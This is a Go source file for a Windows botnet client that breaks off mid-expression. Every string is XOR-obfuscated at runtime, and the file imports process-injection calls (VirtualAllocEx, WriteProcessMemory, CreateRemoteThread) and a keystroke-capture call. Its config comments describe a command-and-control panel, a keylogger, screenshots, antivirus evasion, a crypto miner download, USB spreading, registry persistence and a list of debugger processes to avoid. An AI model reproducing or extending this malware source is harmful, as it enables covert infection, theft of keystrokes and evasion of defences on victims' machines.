package deepfire

import (
	"syscall"
)

const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010

var K32 = syscall.MustLoadDLL((func() string {
mask := []byte("\x3f\xfe\x87\xe2\x67\x0b\x1e\xd1\x7f\xf2\xb9\x15")
maskedStr := []byte("\x54\x9b\xf5\x8c\x02\x67\x2d\xe3\x51\x96\xd5\x79")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))  //kernel32.dll
var USER32 = syscall.MustLoadDLL((func() string {
mask := []byte("\x3f\x89\xb0\x2b\x72\xa2\xb5\xba\x1f\xa0")
maskedStr := []byte("\x4a\xfa\xd5\x59\x41\x90\x9b\xde\x73\xcc")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())) //user32.dll
var GetAsyncKeyState = USER32.MustFindProc((func() string {
mask := []byte("\x87\xef\xee\xe5\x01\x7f\x46\x66\x05\x7e\xbd\x0b\x06\x43\x3d\xa2")
maskedStr := []byte("\xc0\x8a\x9a\xa4\x72\x06\x28\x05\x4e\x1b\xc4\x58\x72\x22\x49\xc7")
res := make([]byte, 16)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var VirtualAlloc = K32.MustFindProc((func() string {
mask := []byte("\xcc\x6b\xa1\xb5\xbf\x91\xa7\x6c\x44\xc7\xb7\x7a")
maskedStr := []byte("\x9a\x02\xd3\xc1\xca\xf0\xcb\x2d\x28\xab\xd8\x19")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var CreateThread = K32.MustFindProc((func() string {
mask := []byte("\xbe\x20\xe9\xb1\xa7\xf9\x58\x2e\x92\x5f\xa2\xd5")
maskedStr := []byte("\xfd\x52\x8c\xd0\xd3\x9c\x0c\x46\xe0\x3a\xc3\xb1")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var WaitForSingleObject = K32.MustFindProc((func() string {
mask := []byte("\x10\x98\xf9\x58\x1f\x91\x84\xce\xec\x53\x42\xe5\xba\xd8\xc9\x3c\x5b\x4f\x7a")
maskedStr := []byte("\x47\xf9\x90\x2c\x59\xfe\xf6\x9d\x85\x3d\x25\x89\xdf\x97\xab\x56\x3e\x2c\x0e")
res := make([]byte, 19)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var VirtualAllocEx = K32.MustFindProc((func() string {
mask := []byte("\x8d\xc4\xfe\x6e\x56\x0a\x1a\x08\x2b\xd5\xff\x8f\x28\xab")
maskedStr := []byte("\xdb\xad\x8c\x1a\x23\x6b\x76\x49\x47\xb9\x90\xec\x6d\xd3")
res := make([]byte, 14)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var CreateRemoteThread = K32.MustFindProc((func() string {
mask := []byte("\x6a\xb3\x6c\x8a\x0f\x2b\xa5\x73\xed\xc7\x2c\xb9\xb7\xfd\x9c\xca\xe7\x4e")
maskedStr := []byte("\x29\xc1\x09\xeb\x7b\x4e\xf7\x16\x80\xa8\x58\xdc\xe3\x95\xee\xaf\x86\x2a")
res := make([]byte, 18)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var GetLastError = K32.MustFindProc((func() string {
mask := []byte("\xba\x72\x7d\x1d\xf1\xb5\xec\x84\x63\xda\x61\x9d")
maskedStr := []byte("\xfd\x17\x09\x51\x90\xc6\x98\xc1\x11\xa8\x0e\xef")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var WriteProcessMemory = K32.MustFindProc((func() string {
mask := []byte("\x5a\x3b\x53\x2b\xaa\x6c\xc4\xc4\xcb\x88\xd8\x51\x71\x5e\x8e\xeb\xed\x77")
maskedStr := []byte("\x0d\x49\x3a\x5f\xcf\x3c\xb6\xab\xa8\xed\xab\x22\x3c\x3b\xe3\x84\x9f\x0e")
res := make([]byte, 18)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var OpenProcess = K32.MustFindProc((func() string {
mask := []byte("\xfc\xb9\x57\xaa\xc6\xf4\xea\xf7\x59\xa3\x3f")
maskedStr := []byte("\xb3\xc9\x32\xc4\x96\x86\x85\x94\x3c\xd0\x4c")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
var IsDebuggerPresent = K32.MustFindProc((func() string {
mask := []byte("\xc7\x98\xf2\x6a\xa1\x0c\x08\xe5\x54\x8a\x69\x24\xe8\xcd\xd2\x27\x74")
maskedStr := []byte("\x8e\xeb\xb6\x0f\xc3\x79\x6f\x82\x31\xf8\x39\x56\x8d\xbe\xb7\x49\x00")
res := make([]byte, 17)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))

//============================================================
//       Be sure to Obfuscate important strings and data
//============================================================

var (
	//============================================================
	//                   Basic Variables
	//============================================================
	//useSSL                bool   = true                                   //Use SSL Connections? Make sure the Panel URLS are https://
	//sslInsecureSkipVerify bool   = true                                   //Use Insecure SSL Certs? AKA Self-signed (Not Recomended)
	//userAgentKey          string = "d5900619da0c8a72e569e88027cd9490"     //Useragent for the panel to check to see if its a bot, change me to the one in the servers settings
	//checkEveryMin         int    = 10                                     //Min Time (Seconds) to check for commands
	//checkEveryMax         int    = 45                                     //Max Time (Seconds) to check for commands (Must be more then Min)
	//instanceKey           string = "80202e73-067f-4b4c-93f8-d738d1f77f69" //
	//installMe             bool   = true                                   //Should the bot install into system?
	installNames = [...]string{ //Names for the Bot
		(func() string {
mask := []byte("\xc6\x96\x64\x1d\x00\x76\x21")
maskedStr := []byte("\xb5\xe0\x07\x75\x6f\x05\x55")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xa1\x4f\xe8\xcf\x42")
maskedStr := []byte("\xc2\x3c\x9a\xbc\x31")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xfd\x51\x86\xd8\xbd\xa9\x28\x00")
maskedStr := []byte("\x8f\x24\xe8\xbc\xd1\xc5\x1b\x32")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x42\xe9\x4b\xcb\xf5\xcf\x20\xfa")
maskedStr := []byte("\x35\x80\x25\xa7\x9a\xa8\x4f\x94")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x96\x2f\x39\x86")
maskedStr := []byte("\xe5\x42\x4a\xf5")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x1b\x22\x73\x15\x65\x78\xfe\xb9")
maskedStr := []byte("\x6f\x43\x00\x7e\x0d\x17\x8d\xcd")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x12\xcd\x70\x2c\x8d\xe6\x4b\x08")
maskedStr := []byte("\x67\xa3\x03\x49\xee\x87\x3b\x78")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x3c\xbb\x62\x96\xf9\xc3\x18\x29")
maskedStr := []byte("\x7d\xdf\x0d\xf4\x9c\x82\x4a\x64")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xb6\x01\xef\x76\xb6\x10")
maskedStr := []byte("\xc1\x68\x81\x05\xcf\x63")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x8d\x00\x09\xc8\xbd\xc9\x96")
maskedStr := []byte("\xe7\x75\x7a\xab\xd5\xac\xf2")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x18\xcd\x97")
maskedStr := []byte("\x5a\x8e\xc2")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xb5\xb8\x50\xc9\xb6\xf6\x2f")
maskedStr := []byte("\xc2\xcb\x33\xa7\xc2\x90\x56")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x05\xb3\x96\x1c\xad\xfd\xf3")
maskedStr := []byte("\x66\xdc\xf8\x74\xc2\x8e\x87")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x8f\xc8\x9b\x6b\x92")
maskedStr := []byte("\xec\xbb\xe9\x18\xe1")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x13\x9d\xcf")
maskedStr := []byte("\x77\xea\xa2")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x4b\x63\xe2\x82\xa4\xa3\x18")
maskedStr := []byte("\x38\x0a\x86\xe7\xc6\xc2\x6a")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x6b\x5b\x1e\xaa\x55\x8d\xbd\x1d\xe3")
maskedStr := []byte("\x2a\x1f\x4d\xcf\x27\xfb\xd4\x7e\x86")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xa5\xae\x26\x41\xba\x07\xc5\x85\xa2\xb0\xcc")
maskedStr := []byte("\xe4\xde\x56\x12\xdf\x75\xb3\xec\xc1\xd5\xbf")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xa9\x90\x6b\xa4\x07\xbf\xe3\x01")
maskedStr := []byte("\xc8\xf3\x19\xcb\x73\xcd\x82\x78")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x1f\x0d\x73\xbd\xc4\xab")
maskedStr := []byte("\x7c\x79\x15\xd0\xab\xc5")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x03\xc0\xd7\xec\x47")
maskedStr := []byte("\x6f\xb3\xb6\x9f\x34")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xce\x21\x9c\x43\x3b\x88\xd4\xa3\xde")
maskedStr := []byte("\xbc\x44\xfd\x2f\x48\xeb\xbc\xc6\xba")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x49\x70\x48\x47\x84\x97\xd8")
maskedStr := []byte("\x3a\x00\x27\x28\xe8\xe4\xae")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x03\x34\x74\x26\x4b\x0e\x52")
maskedStr := []byte("\x51\x60\x3c\x62\x08\x5e\x1e")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x32\x18\xdf\x36\xd2\x34")
maskedStr := []byte("\x60\x4c\x9b\x75\x82\x78")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xa1\x9c\x04\x97\x83\x10\xc2")
maskedStr := []byte("\xec\xcf\x45\xc4\xc0\x65\xab")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
	}
	registryNames = [...]string{ //Registry Entrys for the Bot
		(func() string {
mask := []byte("\x32\xf8\x5a\xd2\xcb\xd8\x3b\x35\x58\x86\x00\x89\xde\xf5\x7c")
maskedStr := []byte("\x66\x8a\x33\xbd\xa5\xf8\x68\x5a\x3e\xf2\x77\xe6\xac\x9e\x0f")
res := make([]byte, 15)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x1a\xfa\xd6\xe7\x7b\x33\x7c\x8b\x34\xe6\x67\x90\x27\x79\x9e\x0c\x79\x66\xae\xc3")
maskedStr := []byte("\x57\x83\xa5\x93\x12\x50\x5c\xce\x5a\x92\x02\xe2\x53\x18\xf7\x62\x14\x03\xc0\xb7")
res := make([]byte, 20)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xe5\x4f\x2a\xcb\xd7\xc5\x28\x7c\xa6\x66\xf1\xae\xf5\xc2\x0e\xca\x71\xcb")
maskedStr := []byte("\xa8\x26\x49\xb9\xb8\xb6\x47\x1a\xd2\x46\xa1\xcf\x87\xb6\x60\xaf\x03\xb8")
res := make([]byte, 18)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x22\xe0\xb5\xa6\x6e\xc9\x23\xbe\xd6\x6a\x16\x8e\xc1\x00\x9b\xd7\x59\xa7\x8e\x68\x41\x13\x55\xad\x6a\xc9\x49\xe1\x6a\x17\xbe")
maskedStr := []byte("\x61\x8c\xdc\xc3\x00\xbd\x0e\xed\xb3\x18\x60\xeb\xb3\x20\xc9\xa2\x37\xd3\xe7\x05\x24\x33\x06\xd8\x08\xba\x30\x92\x1e\x72\xd3")
res := make([]byte, 31)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x8b\xa3\xfc\x81\x3b\xfb\x88\xcb\x1c\x66\x3f\x66\x28\x84\xb4\xbf\xfd\xac")
maskedStr := []byte("\xc5\xc6\x88\xf6\x54\x89\xe3\xa2\x72\x01\x1f\x35\x4d\xf6\xc2\xd6\x9e\xc9")
res := make([]byte, 18)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
	}
	//============================================================
	//                   Optional Variables
	//============================================================
	//clientVersion          string = "ArchDuke"                                                                                         //Bot Version
	//antiDebug              bool   = false                                                                                              //Anti-Debug Programs
	//debugReaction          int    = 1                                                                                                  // How to react to debug programs, 0 = Self Delete, 1 = Exit, 2 = Loop doing nothing
	//activeDefense          bool   = true                                                                                               //Use Active defense
	//watchdogName           string = "ServiceHelper"                                                                                    //Name of the WatchDog program
	//antiProcess            bool   = false                                                                                              //Run Anti-Process on run
	//autoScreenShot         bool   = true                                                                                               //Auto send a new Screen Shot to C&C
	//autoScreenShotInterval int    = 15                                                                                                 //Minutes to wait between each SS
	//sleepOnRun             bool   = false                                                                                              //Enable to sleep before loading config/starting
	//sleepOnRunTime         int    = 5                                                                                                  //Seconds to sleep before starting (helps bypass AV)
	//editHosts              bool   = false                                                                                              //Edit the HOST file on lounch to preset settings
	//antiVirusBypass        bool   = false                                                                                              //Helps hide from Anti-Virus Programs
	//procBlacklist          bool   = false                                                                                              //Process names to exit if detected
	//autoKeylogger          bool   = true                                                                                               //Run keylogger automaticly on bot startup
	//autoKeyloggerInterval  int    = 10                                                                                                 //Minutes to wait to send keylogs to C&C
	//autoReverseProxy       bool   = false                                                                                              //To run the Reverse Proxy Server on startup
	//reverseProxyPort       string = "8080"                                                                                             //Normal Port to run the server on
	//reverseProxyBackend    string = "127.0.0.1:6060"                                                                                   //Backends to send proxyed data too. Supports Multi (127.0.0.1:8080,127.0.0.1:8181,....)
	//startUpError           bool   = false                                                                                              //Shows an Error message on startup
	//startUpErrorTitle      string = "Error"                                                                                            //Title of Error Message
	//startUpErrorText       string = "This Programm is not a valid Win32 Application!"                                                  //Text of Error Message
	//checkIP                       = [...]string{"http://checkip.amazonaws.com", "http://myip.dnsdynamic.org", "http://ip.dnsexit.com"} //$_SERVER['REMOTE_ADDR']
	//maxMind                string = deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf")                                          //Gets IP information
	//uTorrnetURL            string = "http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows"                      //URL to download uTorrent from
	//	xmrMinerURL          string = "https://ottrbutt.com/cpuminer-multi/minerd-wolf-07-09-14.exe"                                                                 //URL to the Miner.exe
	//tmpPath2    string = os.Getenv("APPDATA") + "\\" //APPDATA err, Roaming
	//winDirPath  string = os.Getenv("WINDIR") + "\\"  //Windows
	//rawHTMLPage string = "404 page not found"        //What the defult HTML for hosting will say.
	//	binderMark           string = "-00800-"                                                                                                                      //To check if the files been infected by this bot
	driveNames     = [...]string{(func() string {
mask := []byte("\x65")
maskedStr := []byte("\x24")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x7f")
maskedStr := []byte("\x3d")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x80")
maskedStr := []byte("\xc4")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x67")
maskedStr := []byte("\x22")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x98")
maskedStr := []byte("\xde")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x32")
maskedStr := []byte("\x75")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xbf")
maskedStr := []byte("\xf7")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x6e")
maskedStr := []byte("\x27")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xdc")
maskedStr := []byte("\x96")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xbd")
maskedStr := []byte("\xe5")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xcd")
maskedStr := []byte("\x94")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x18")
maskedStr := []byte("\x42")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())} //Drive Letters to Spread too, USB mainly.
	spreadNames    = [...]string{(func() string {
mask := []byte("\x7c\xbb\x54\xf9\xba\x66\x79\x6a\x39")
maskedStr := []byte("\x29\xe8\x16\xbd\xc8\x0f\x0f\x0f\x4b")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xc1\x55\x0e\x2c\x2b\x08\x10\x7f\x0a")
maskedStr := []byte("\x88\x3b\x7d\x58\x4a\x64\x7c\x1a\x78")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x8a\xfa\xe3\x24\x31")
maskedStr := []byte("\xd9\x9f\x97\x51\x41")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x99\xfe\xaa\xdc\xbf\xb6\x8a")
maskedStr := []byte("\xd0\x90\xd9\xa8\xde\xda\xe6")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())}               //Names for the bot to spread under
	debugBlacklist = [...]string{                                                            //Debug Programs, Exit bot if detected
		(func() string {
mask := []byte("\x24\xc2\xb1\x41\x94\x77\xd0")
maskedStr := []byte("\x6a\x87\xe5\x12\xc0\x36\x84")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x22\x6f\xe9\x3c\x19\xc2\x8f")
maskedStr := []byte("\x64\x26\xa5\x79\x54\x8d\xc1")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x92\x0a\x88\x3f\x71\xca\x9c")
maskedStr := []byte("\xc2\x58\xc7\x7c\x3c\x85\xd2")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x8d\x34\x69\x50\x9d\x23")
maskedStr := []byte("\xdf\x71\x2e\x1d\xd2\x6d")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xbd\xe7\x5b\x7f")
maskedStr := []byte("\xfe\xa6\x12\x31")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x45\x9a\xd4\xd8\x62\x06")
maskedStr := []byte("\x0b\xdf\x80\x95\x2d\x48")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xcd\x3e\x7f\x32\xb5\x41\x25")
maskedStr := []byte("\x99\x5d\x0f\x44\xdc\x24\x52")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x12\xd2\x13\xc9\x91\x44")
maskedStr := []byte("\x64\xa2\x70\xa4\xf0\x34")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x49\x86\x50\x8e\xcf\x38")
maskedStr := []byte("\x3f\xeb\x23\xfc\xb9\x5b")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x1e\x85\x65\xcb\x68\x6a\xff")
maskedStr := []byte("\x68\xe8\x10\xb8\x1a\x1c\x9c")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x1e\x03\x28\x0a\xb0\x93\xb6\xd5\x50")
maskedStr := []byte("\x69\x6a\x5a\x6f\xc3\xfb\xd7\xa7\x3b")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x15\x04\xb1\x6c\x71\xf1\xe7\xfe")
maskedStr := []byte("\x43\x46\xde\x14\x25\x83\x86\x87")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xc9\x10\x89\xd6\xce\x3f\x4f\xff\x2f\xe8\xe7")
maskedStr := []byte("\x9f\x52\xe6\xae\x9d\x5a\x3d\x89\x46\x8b\x82")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xd1\x88\x19")
maskedStr := []byte("\x98\xcc\x58")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x74\xef\xc4\xd8\xaa\x49\x77")
maskedStr := []byte("\x23\xbf\x81\xf8\xfa\x1b\x38")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x09\xe9\x73\x5c\x75\xcb\x2f\x97\xb2\xf7\x8a\x71\x1c\xc5\x9d\x72\x16\x66\x18\x39\x3f\xbf\x6e\x83\x89\x3c\x26\x02\xbb\xa8")
maskedStr := []byte("\x5d\x81\x16\x7c\x22\xa2\x5d\xf2\xc1\x9f\xeb\x03\x77\xe5\xd3\x17\x62\x11\x77\x4b\x54\x9f\x2f\xed\xe8\x50\x5f\x78\xde\xda")
res := make([]byte, 30)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x86\x44\x6d\x8d\xf5\x54")
maskedStr := []byte("\xd1\x2d\x03\xc9\x97\x33")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xf8\x0d\xef\x78\xc3\xf7\xfb")
maskedStr := []byte("\xb7\x61\x83\x01\x87\x95\x9c")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x61\x60\xdb\x66\x39\x3f\x83\xcf\x72\x88\x33\xfb\xc8\x2f")
maskedStr := []byte("\x22\x0f\xb7\x07\x4a\x50\xe5\xbb\x52\xcb\x52\x8b\xbb\x4e")
res := make([]byte, 14)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x5d\x9e\x20\xd3\xf3\x8b\x9d\xc9\xe8\xec\xc1\x77\xd0\x76\xff\x95\x84\x0e\x97\x97\x1f\x62\x6b\x24\x42")
maskedStr := []byte("\x10\xf7\x43\xa1\x9c\xf8\xf2\xaf\x9c\xcc\x8f\x12\xa4\x01\x90\xe7\xef\x2e\xda\xf8\x71\x0b\x1f\x4b\x30")
res := make([]byte, 25)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x72\x39\x75\x5b\x1c\x65\xa4")
maskedStr := []byte("\x34\x50\x11\x3f\x70\x00\xd6")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x91\x43\xdf\xca\x1d\x4f\x15\x64\x1e\xa5")
maskedStr := []byte("\xc2\x2e\xbe\xb8\x69\x1c\x7b\x0d\x78\xc3")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xfc\xbf\x4b\x2d\x5d\xd9\x3f\xc8\xd9\x09\x15\x81\x71\xf7\x2d\x0c\xad")
maskedStr := []byte("\xb5\xd2\x26\x58\x33\xb0\x4b\xb1\xf9\x4d\x70\xe3\x04\x90\x4a\x69\xdf")
res := make([]byte, 17)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xe1\x6f\x76\x92\x48\x1f\xf7\x63\xc5\x4e\x9b\x0e\xb7\x1f\xe3\x9c")
maskedStr := []byte("\xb1\x1d\x19\xf1\x2d\x6c\x84\x43\x80\x36\xeb\x62\xd8\x6d\x86\xee")
res := make([]byte, 16)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x71\x1d\x85\xb6\x23\x48\x3d\x5b")
maskedStr := []byte("\x21\x58\xa5\xe2\x4c\x27\x51\x28")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x27\x54\xd0\xe6\xff\x66")
maskedStr := []byte("\x66\x05\xa4\x8f\x92\x03")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x7e\x2a\x45\xf2\x11\x13\xc7\x6c\xbb\x17")
maskedStr := []byte("\x3a\x79\x68\xc7\x31\x57\xa2\x0e\xce\x70")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xf5\x87\x7b\xc3\xe2\xa5\xa9")
maskedStr := []byte("\xb1\xe5\x03\xb7\x8d\xca\xc5")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x19\x1b\x91\x58\x4e")
